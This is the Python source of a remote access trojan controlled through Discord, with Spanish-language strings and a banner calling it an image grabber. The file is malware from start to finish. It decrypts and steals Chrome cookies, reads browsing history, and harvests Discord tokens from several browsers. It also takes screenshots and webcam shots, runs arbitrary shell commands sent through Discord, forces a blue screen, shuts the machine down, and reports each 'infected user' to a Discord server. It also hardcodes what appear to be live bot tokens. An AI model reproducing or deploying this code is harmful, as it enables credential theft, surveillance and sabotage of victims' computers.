from discord.ext import commands
from PIL import ImageGrab
import subprocess
import time
import os
import io
import sqlite3
import ctypes
import discord
import shutil
import json
import base64
import win32crypt
import pycookiecheat
import getpass
import platform
import requests
import win32com.client as wincl
import ctypes
import re
import json
import socket
import colorama
import win32gui
import asyncio
from colorama import init, Fore
from urllib.request import urlopen
import logging
from pathlib import Path
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger('discord.client').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)


init()







intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', help_command=None, intents=intents)


async def run_bot():
    await bot.start("OTEzMTgzNTI4NTQ2NjExMjQy.GHlayo.bMDO5rucURNnYdhn4YMdB-uiJIvvMfwvy_PVqY")
    # minimize the window after starting the bot
    hwnd = win32gui.FindWindow(None, "window_title")  # replace "window_title" with the actual title of the program's window
    win32gui.ShowWindow(hwnd, win32gui.SW_MINIMIZE)  # minimize the window





def tahg(pene):
    x = json.loads(open(os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Local State", "r", encoding="utf-8").read())
    try:
        mk = win32crypt.CryptUnprotectData(base64.b64decode(x["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    except:
        mk = ""
    try:
       return (AES.new(mk, AES.MODE_GCM, pene[3:15]).decrypt(pene[15:])[:-16]).decode()

    except:
        return ""




@bot.command()
async def getcookies(ctx):
    get_chrome_cookies()
    await ctx.send(file=discord.File(os.environ['TEMP'] + "\\cookies.txt"))
    await ctx.send("[*] Command successfully executed")
def get_chrome_cookies():
    shutil.copyfile(os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", os.environ['TEMP'] + "\\asd")
    con = sqlite3.connect(os.environ['TEMP'] + "\\asd")
    cursor = con.cursor()
    cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
    file = open(os.environ['TEMP'] + "\\cookies.txt", "w+")
    for cookie in cursor.fetchall():
        file.write(f"{cookie[0]} - {cookie[1]} - {cookie[2]} - {tahg(cookie[3])}\n")
    cursor.close()
    con.close()
    file.close()

@bot.command()
async def screenshot(ctx):
    image = ImageGrab.grab()
    with io.BytesIO() as image_binary:
        image.save(image_binary, 'PNG')
        image_binary.seek(0)
        file = discord.File(image_binary, filename='screenshot.png')
        await ctx.send(file=file)
    await ctx.send("[*] Command successfully executed")


@bot.event
async def on_ready():
    guild_id = 1070633873374986271
    guild = bot.get_guild(guild_id)
    if guild is None:
        print(f"No se pudo encontrar un servidor con el ID {guild_id}")
        return

    channel_name = os.getlogin()
    channel = await guild.create_text_channel(channel_name)
    system_info = f"**OS**: {platform.system()} {platform.release()}\n**CPU**: {platform.processor()}"
    ip_address = socket.gethostbyname(socket.gethostname())
    embed = discord.Embed(title="Nuevo Usuario Infectado", description=f"**Usuario:** {channel_name}\n**IP:** {ip_address}", color=0x000000)
    embed.set_thumbnail(url='https://media.discordapp.net/attachments/847380398283685919/1079575682193031188/tumblr_n4dhaindMe1ste05mo1_400.gif')
    await channel.send(embed=embed)




banner = (Fore.RED + """

         .'......,;..c' ;; .;..''...'. ,' 'c..;..',. .,'.';. .. ', .,......':. ;: 'cl'.,...:;.',,.... .. ':..;,..''.... ;c..,. ';..;,..;:.,d' ;, 'l. ... ,:..;
 ',......';..;. ,' .,..,,'.....,, 'c. '..',..';,..;..;. .' .:,..'...;' ;: .cc. ....,'.':;..,. ,' ',.........'c' ';..c, ....'...:;.'c. ,, ,o,.,;......:
.,:...,'.:c..c. ,, .,..;,..... ,; ';..:'......'..':..c, .,..c,.''..'l;.ldcodl..'...,,..''.'c. ;, ';..;'...'..:' ;c..l,.::..;,...'..'. '' 'l'.,,''....:
.;c'.,;,.,,..c. ,, .:,.,;......:; ':..,. .,'.''. ,:. ,' .' .l;..',;oOOOKkdkOK0xl,.'c;..,'..;. ,. ,:..:;......:, ;c..;..,,..::'..,..,. '. .;......,;..,
 ,c' ,:'.', .c. ,, .c, .,......,, .' .:,..'..... ';. '. ', .:'.;dO0KK0Okdclox0XX0xoo;...'.... .. ,:..c:..'.  .' ', .;. ;:..''..,, .,. '. .'......',..:
 ,c'.',..;c..c' ;: .l,.;:,..,. .' .;. '..'...,:,.':..;' ', .:dkXNKOxdlll;...,lxOKNNKd'  ...:. ,' ':..;,...'..;, ;c..:..''..'.'..'..l' '' .'......'' .'
 ':'.'...;c..o, '' .;' ';'.,:'.', .;..,. .;'.','.':..c, ,:.c0WWNKxl,''',..   .,lk0KXNKo'. .:. :, .,..,;..',..c;.,: .:. ',..::.... .c. ;, .,..''..''..;
 .;'.''..',..,. '' .:'.,;'..,. '' .:..:'.':'..,'.;c..c, ,x0NWNNKOo;'...........,cxO0K00Oo'.,. ;' ,c..:;..;,..,' ,: .:' ,:..''..;,..c. ,, ':..;;..,;..,
 .;'.,;..,,. '. ,, .;....'.,:..:; .,..:,.,:..';..,c..:'.oNNXXXKOdl:;,,;;;,'.',:clodxxxxk00ko. ,' ;o..:;..,'..'. '; .c,.,;..''..::..c. '' .;..',..',..;
 .'..''..,' .c' ,, .'. .''.,:..,; .,..;'.''..';,.,c. .;xNNXK0kxoc:;;;;,'''''...,;;::ccldxOXK; ,' .,..:;...'..;' .' .:'.,,..;;..,,..;. .' .:. ',...,..,
 ... ,c..;; .;. ;; .:'.,,'.';..;, .,..,..,,..';,.,c. :KWXKOxolcc:;::;,,',,','..','',;:;:cokK0oc' .. .;,..',..;. '; ....;:......   .:. .. ';..;:..',..:
.....;:..:c.... '' .'..'.. ;l..', 'c..c,.,,..,:,.':.;0WX0kolll::;;,,,........ ......,;::;,:ox0Ko.':......'...,. ,: .'..''..:;......:. ,, .,..,,.... .:
 ''..,;'.;c..'. ;; .,..','.,:..;; 'c..;' ....,;..;cc0N0kko:;;'...................  ........'':dOOx:. ,,..''..:' ,: .;. ''..''..;,.'c' ;; .;.....',' .;
 ''...''.::..c' ;; .,..'...;c..'' .,..;' .;,..,'.;kXNkl:;..             ........     ..........,cxOo,,'.':;..,. ,: .:'........';,..:. '. ',..'...''..;
 .'. ....:; 'l, '' .;......;:..,; .'..:,.,,. ':cx0Odc'.               .........                  .,okx,..;;..:' ,:..:. '. .,,..',..;. '' .,. ,;'.....c
 ';..',..', .c' ,, ,c..';..;;..,' .,..;'.';...l0kl,.                  ........       ....           'll'.;:..:, ', .;. ;:. ',..',..c' '. ':..,;..',..:
.;c..',..,;..:' ,, 'l,.''...'..;, .;..l; ...,oo:..         ....       .''''''.       ......          .:o;::..;, '; .c' ;l..,,..,,..c' .. ,c..,'. ';..,
.....''..,;..:' ;; .c'.,'...,..,, .,..;'....::.          .......      .,,,,,,'.     ........          .:c:;..,' ', .c'.,'......',..;. '' ,l'.,'. .'..:
..'. .'..,;..;' :c .c,.,,..';. .' .;. '...',:'         ......'''.....,,;;;;;;;,.....''''......         .;c,..l: ,c..c' .. .....,;..:. '. 'l,.;:'.';..,
 .;. ....,, .,. ;; .c,.,,..,:'.,, .. .;'...,;.        ......'',,,;;;;;;;;;:::;;;;;;;,,,'......          ,:,..;' ,; .c' ....'...,,..c. ,, .c'.,:'.,;..,
 ';'.,,...'..:. ;; 'c'.....',..;, .;..:'..,c,         .....',,'',;::::::::::::::::;,'',,''....         .,....;' ,; .'..,'..;;..''..:. '' ':..;;'.,;..;
.,:'.:;...,..c' ;: .:'.....',..;, ':..,..';;'          ...'',,,'....'',,,,,,,,''.....,,,''...         .'..'..'. '; .;..::..;;..''..c' ;, .;..''...,..,
.,:...''.';..;. ,; .:'.....';..,' 'c..;. ':,,,           ...',;:,.                 ';;;,...          ,,..;,.... .' .;..,' .;:'.,;..l' '' .,..,...,;. '
 ':..,,..,,..;' ,; .,..,'......;; .;..:, .:,.,.              ...                    ...            .'c;..... .. .' .:'.cl..;,..;;.'o' '' 'c..'...',..;
.;l,.,;..,;..;. ;: .:..,;'..,.... .,..,'  .. .;.                                                  .'':,...'..,' '; .:'.:l. ,;..''..c' ,, .,..'.. ....l
.;:'.;:..;c..,. ,' .:'.'''..;..,, ':..:' ... .:,.                                                ';..;,...'..,' ', .:'.;,  ,;......c. ;; .,..'...   .;
.'...;:'.';..l' '' .'. ';,.,:. .' .,..:' .c, .''...                                             ,l;..:;.';;..'. '; .:' ''......,;..;. ,, .;..'....'..;
.''..,;..,;..c' ;:..'. .''.''  ;; .. .,. ':,.',;;;;.                                           ,lxdlcl;..,' .,. ,:..:' ;c..'...,;. .. ,, 'l..........;
.',..,;..',..c' :c..:..';'..'. .' .. .;,.':;;ccc;....                                        .',',cdxkxl::,..,' ':..c'.:c.....'c:. .. '' 'l' .,......'
.''..';'.',..;. ,; 'c'.,;'..,. '' .;..;,,loc:,'...  ..                                      .','''.,;:ldxxd;... ,:..:. ;:'.''.':, .;' '' .c' .;..''..;
.,;..;:'.;;..'. ,, .;' ':. ....:: .'..oxdo:,'...      ..                                   ...'',,..';:::cdkOk; ;c .,..,,..,'..;;..c' ,, 'c'.;:. ',...
.,:..''...,..;. ;: .;'.,;. .'..;; .;cxkoc;,'..         ..                                 ..  ..,;'. ';;,,,,ck0:,;..:..,'..,,.'cc..'. .. ,l..;'...'..,
.,:..,,..,,..:. .. .c'.....,,..;; 'k0xc:;,'..            .                                '.    .,,. .,'..'..'dxl; .:'.::..;;..,,..'. '. .,.....'....:
 ';'.,,..;;..;. '. .:'......,. ;;'d0d:::,'...           .'.                               ,,     .,' .'.     .c:oc .c'.::..,' ..'..,. ,, .:..'''',:..c
 ,,..'...::..,. ,' .,..,'..,:. .:xxo:'',;..             .,.                               ;,      .'...      .:.'l..c, ....;'..::..:. ;; 'c' ',..,;..;
.;:..,;'.';..;. ,; .,'.',..,:..:kxc,....,'              .,.                              .:,        .''.     .'. cl':..;:..::..;:..,. ;, .:' ....,,..:
.;'. ';..;:..:' :c..,..,:'.,:..:xc,.    .'.             .,'.                              c;         .'.     ..  'do:..:;..,'...'..c' ;, .c..,,..',..c
.,:. ....':..;. ,; 'c..''..,:..:o;.      ..              ''.                              ::          ..     ..  .;oo..,'..,,..''..l' '' .:. ''..,,..o
..'......;:..'. ;; .c,.,,. ,:..cc'       ..              ....                             cc           .          .,l'.'...,' .::..c. ,, .:..;;'.....;
......  .;:..:. ,, .:'.,,. ,c'.,;.                       ...                              lo.          .          . .. ,,..''..:;..c' ;; .,..;:...'..;
.'.......;;..;. .. 'c'.''..;c....                        ..                               lo.                       ...:c..,'...'..,. '. .,.......,..;
.''. ....::..;' '' .;..,'..';.  .                        ..                              .lc                          .:c..;;.... .'. '' ',.......,..'    



                        ██▓ ███▄ ▄███▓ ▄▄▄        ▄████ ▓█████   ▄████  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
                        ▓██▒▓██▒▀█▀ ██▒▒████▄     ██▒ ▀█▒▓█   ▀  ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
                        ▒██▒▓██    ▓██░▒██  ▀█▄  ▒██░▄▄▄░▒███   ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
                        ░██░▒██    ▒██ ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
                        ░██░▒██▒   ░██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
                        ░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░ ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
                         ▒ ░░  ░      ░  ▒   ▒▒ ░  ░   ░  ░ ░  ░  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
                         ▒ ░░      ░     ░   ▒   ░ ░   ░    ░   ░ ░   ░   ░░   ░   ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
                         ░         ░         ░  ░      ░    ░  ░      ░    ░           ░  ░ ░       ░         ░  ░   ░     

                                                      [Iniciare en 3 minutos]


                                                         
""")
print(banner)


@bot.command()
async def shell(ctx, *args):
    command = ' '.join(args)
    try:
        output = subprocess.check_output(command, shell=True).decode('cp1252')
    except subprocess.CalledProcessError as e:
        output = e.output.decode('cp1252')
    embed = discord.Embed(title="Shell Output", description=output)
    await ctx.send(embed=embed)



@bot.command()
async def history(ctx):
    import sqlite3
    import os
    import time
    import shutil
    
    temp = (os.getenv('TEMP'))
    Username = (os.getenv('USERNAME'))
    shutil.rmtree(temp + r"\history12", ignore_errors=True)
    os.mkdir(temp + r"\history12")
    path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
    path_new = temp + r"\history12"
    copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
    os.system(copy_me_to_here)
    
    con = sqlite3.connect(path_new + r"\history")
    cursor = con.cursor()
    cursor.execute("SELECT url FROM urls")
    urls = cursor.fetchall()
    
    for x in urls:
        done = ("".join(x))
        f4 = open(temp + r"\history12" + r"\history.txt", 'a')
        f4.write(str(done))
        f4.write(str("\n"))
        f4.close()
    
    con.close()
    file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
    await ctx.send("[*] Command successfully executed", file=file)
    
    def deleteme() :
        path = "rmdir " + temp + r"\history12" + " /s /q"
        os.system(path)
        
    deleteme()






@bot.command()
async def wallpaper(ctx):
    import ctypes
    import os
    path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
    await ctx.message.attachments[0].save(path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
    await ctx.send("[*] Command successfully executed")


@bot.command()
async def message(ctx, *args):
    import ctypes
    import time
    MB_YESNO = 0x04
    MB_HELP = 0x4000
    ICON_STOP = 0x10
    
    def mess():
        ctypes.windll.user32.MessageBoxW(0, ' '.join(args), "Error", MB_HELP | MB_YESNO | ICON_STOP)
        
    import threading
    messa = threading.Thread(target=mess)
    messa._running = True
    messa.daemon = True
    messa.start()
    
    import win32con
    import win32gui
    
    def get_all_hwnd(hwnd,mouse):
        def winEnumHandler(hwnd, ctx):
            if win32gui.GetWindowText(hwnd) == "Error":
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                return None
            else:
                pass
        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
            win32gui.EnumWindows(winEnumHandler,None)
    
    await ctx.send("[*] Command successfully executed")
    win32gui.EnumWindows(get_all_hwnd, 0)


@bot.command()
async def bluescreen(ctx):
    # Llama a la función "Kernel32.dll" y realiza un "crash"
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))


@bot.command()
async def descargar(ctx, *args):
    command = ' '.join(args)
    try:
        subprocess.check_call(command, shell=True)
        subprocess.check_call(command, shell=True)
        user = getpass.getuser()
        embed = discord.Embed(title=f"Descarga Exitosa ({user})", color=0x00FF00, description="La descarga se completó correctamente en tu PC.")
        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')
    except subprocess.CalledProcessError as e:
        embed = discord.Embed(title="Error al Descargar", color=0xFF0000, description="No se pudo completar la descarga. Revisa si ingresaste los comandos correctamente.")
        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')
    await ctx.send(embed=embed)



@bot.command()
async def cam(ctx):
    ImageGrab.grab(bbox=(0,0,640,480)).save('camera.png', 'PNG')
    await ctx.send(file=discord.File('camera.png'))

@bot.command()
async def stop(ctx):
    os.system("shutdown /s /t 1")

def get_account_name(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
    }
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return r.json()["username"] + "#" + r.json()["discriminator"]
    except:
        return "Unknown"

@bot.command()
async def tokens(ctx):
    paths = [
        os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), ".discordptb", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera", "Local Storage", "leveldb"),
    ]
    tokens = []
    for path in paths:
        if not os.path.exists(path):
            continue
        
        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue

            for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if x.strip()]:
                for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
                    for token in re.findall(regex, line):
                        account_name = get_account_name(token)
                        tokens.append((account_name, token))
    
    if not tokens:
        await ctx.send("No se encontraron tokens.")
    else:
        embed = discord.Embed(title="Tokens encontrados:", color=0xfafafa)
        for token in tokens:
            account_name = token[0]
            token = token[1]
            embed.add_field(name=account_name, value=f"```{token}```", inline=False)
        await ctx.send(embed=embed)
        

@bot.command()
async def voice(ctx):
    volumeup()
    speak = wincl.Dispatch("SAPI.SpVoice")
    speak.Speak(ctx.message.content[7:])
    await ctx.send("[*] Command successfuly executed")

def volumeup():
    pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('El comando que ingresaste no existe. Inténtalo de nuevo.')

@bot.command()
async def webcampic(ctx):
    temp = os.getenv('TEMP')
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite(temp + r"\temp.png", frame)
    cap.release()
    
    with open(temp + r"\temp.png", "rb") as image_file:
        img = Image.open(io.BytesIO(image_file.read()))
    
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    
    file = discord.File(io.BytesIO(img_byte_arr), filename="temp.png")
    await ctx.send("[*] Command successfully executed", file=file)



bot.run("OTEzMTgzNTI4NTQ2NjExMjQy.GTqtPh.G5URGlnI54swuJ83yKJScF9CDZPrSuhWOvM9M4")